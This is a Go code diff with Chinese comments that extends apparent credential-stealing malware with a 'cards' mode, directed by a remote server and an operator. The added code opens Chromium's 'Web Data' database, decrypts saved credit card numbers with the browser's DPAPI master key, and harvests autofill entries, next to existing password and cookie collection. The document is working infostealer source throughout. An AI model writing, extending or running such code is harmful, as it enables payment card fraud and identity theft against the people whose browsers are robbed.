@@ -57,18 +57,24 @@ func collectBrowserCredentials(tech string) (CollectedBrowserArtifact, error) {
 
 	tech = strings.ToLower(strings.TrimSpace(tech))
 
-	// 技术白名单：服务端只下发 all/chrome/edge/firefox，客户端也自己守一遍 ——
+	// 技术白名单：服务端只下发 all/chrome/edge/firefox/cards，客户端也自己守一遍 ——
 	// 拼错的值若落进下面的过滤逻辑，会表现为"不过滤"，静默采集了两家的数据，
 	// 与操作员的选择不符（行为不可预测比直接报错更糟）。
 	switch tech {
-	case "all", "chrome", "edge", "firefox":
+	case "all", "chrome", "edge", "firefox", "cards":
 	default:
-		return art, fmt.Errorf("不支持的浏览器技术: %s（可选 all/chrome/edge/firefox）", tech)
+		return art, fmt.Errorf("不支持的浏览器技术: %s（可选 all/chrome/edge/firefox/cards）", tech)
 	}
 
 	// Chromium 系（chrome / edge）：User Data + DPAPI 主密钥 + AES-GCM。
 	// firefox 不走这条链路（NSS 结构完全不同），见下面的 Firefox 分支。
+	// cards 是 Chromium 的 `Web Data`（信用卡 + 自动填充）：只读 Web Data，
+	// 不碰 Login Data/Cookies —— 单独开关，混进 all 会把噪声带进每一次采集。
 	if tech != "firefox" {
+		mode := collectModeAll
+		if tech == "cards" {
+			mode = collectModeWebData
+		}
 		roots := browserRoots()
 		if tech == "chrome" || tech == "edge" {
 			filtered := make([]browserTarget, 0, len(roots))
@@ -84,7 +90,7 @@ func collectBrowserCredentials(tech string) (CollectedBrowserArtifact, error) {
 			}
 		}
 		for _, target := range roots {
-			profiles, err := collectFromUserDataDir(target)
+			profiles, err := collectFromUserDataDir(target, mode)
 			if err != nil {
 				art.Errors = append(art.Errors, fmt.Sprintf("%s: %v", target.name, err))
 				continue
@@ -107,8 +113,16 @@ func collectBrowserCredentials(tech string) (CollectedBrowserArtifact, error) {
 	return art, nil
 }
 
+// 采集模式：all = 口令 + Cookie；webData = 只读 Web Data（信用卡 + 自动填充）
+type collectMode int
+
+const (
+	collectModeAll collectMode = iota
+	collectModeWebData
+)
+
 // collectFromUserDataDir 处理一个浏览器的 User Data 目录（多配置）
-func collectFromUserDataDir(target browserTarget) ([]CollectedProfile, error) {
+func collectFromUserDataDir(target browserTarget, mode collectMode) ([]CollectedProfile, error) {
 	entries, err := os.ReadDir(target.root)
 	if err != nil {
 		return nil, fmt.Errorf("读取 User Data 失败: %w", err)
@@ -130,6 +144,23 @@ func collectFromUserDataDir(target browserTarget) ([]CollectedProfile, error) {
 		prof := CollectedProfile{
 			Name: target.name, Profile: e.Name(), UserDataDir: dir,
 			Tech: "v10/v20", MasterKey: keyB64,
+		}
+
+		if mode == collectModeWebData {
+			// 卡号同样是 v10/v20 密文，复用同一把浏览器主密钥；自动填充是明文
+			prof.Tech = "v10/v20 (Web Data)"
+			cards, autofill, werr := readWebData(filepath.Join(dir, "Web Data"), masterKey, target.name, e.Name())
+			if werr != nil {
+				// 单个配置读失败不影响其它配置；errors 由调用方按浏览器粒度汇总
+				prof.Cards, prof.Autofill = nil, nil
+			} else {
+				prof.Cards, prof.Autofill = cards, autofill
+			}
+			if len(prof.Cards) == 0 && len(prof.Autofill) == 0 {
+				continue // 没卡也没自动填充（很常见），不占制品
+			}
+			out = append(out, prof)
+			continue
 		}
 
 		creds, cerr := readLoginData(filepath.Join(dir, "Login Data"), masterKey, target.name, e.Name())
@@ -343,35 +374,39 @@ func hostnameOrEmpty() string {
 	return h
 }
 
-func stringValue(v interface{}) string {
-	switch x := v.(type) {
-	case string:
-		return x
-	case []byte:
-		return string(x)
-	default:
-		return ""
+// readWebData 读 Chromium 的 `Web Data`：信用卡（卡号加密）+ 自动填充（明文）。
+//
+// 两张表任一缺失都不算错误（老版本或用户从没存过）：另一张照常采。
+// 卡号解密失败逐条跳过并记日志 —— 与口令同样的取舍，不因为一张卡解不开丢掉整份。
+func readWebData(path string, key []byte, browser, profile string) ([]CollectedCard, []CollectedAutofill, error) {
+	db, cleanup, err := openBrowserDB(path)
+	if err != nil {
+		return nil, nil, err
 	}
-}
+	defer cleanup()
 
-func bytesValue(v interface{}) []byte {
-	switch x := v.(type) {
-	case []byte:
-		return x
-	case string:
-		return []byte(x)
-	default:
-		return nil
+	var cards []CollectedCard
+	if tb, terr := db.Table("credit_cards"); terr == nil {
+		rows, rerr := tb.Rows(nil)
+		if rerr != nil {
+			debuglog.Printf("⚠️ [BROWSER] %s/%s credit_cards 读取失败: %v\n", browser, profile, rerr)
+		}
+		cards = cardsFromRows(rows, key, browser, profile)
 	}
-}
 
-func intValue(v interface{}) int64 {
-	switch x := v.(type) {
-	case int64:
-		return x
-	case float64:
-		return int64(x)
-	default:
-		return 0
+	var autofill []CollectedAutofill
+	if tb, terr := db.Table("autofill"); terr == nil {
+		rows, rerr := tb.Rows(nil)
+		if rerr != nil {
+			debuglog.Printf("⚠️ [BROWSER] %s/%s autofill 读取失败: %v\n", browser, profile, rerr)
+		}
+		autofill = autofillFromRows(rows)
 	}
+
+	if len(cards) == 0 && len(autofill) == 0 {
+		return nil, nil, fmt.Errorf("Web Data 里没有信用卡或自动填充条目")
+	}
+	debuglog.Printf("🔑 [BROWSER] %s/%s Web Data: %d 张卡 / %d 条自动填充\n",
+		browser, profile, len(cards), len(autofill))
+	return cards, autofill, nil
 }
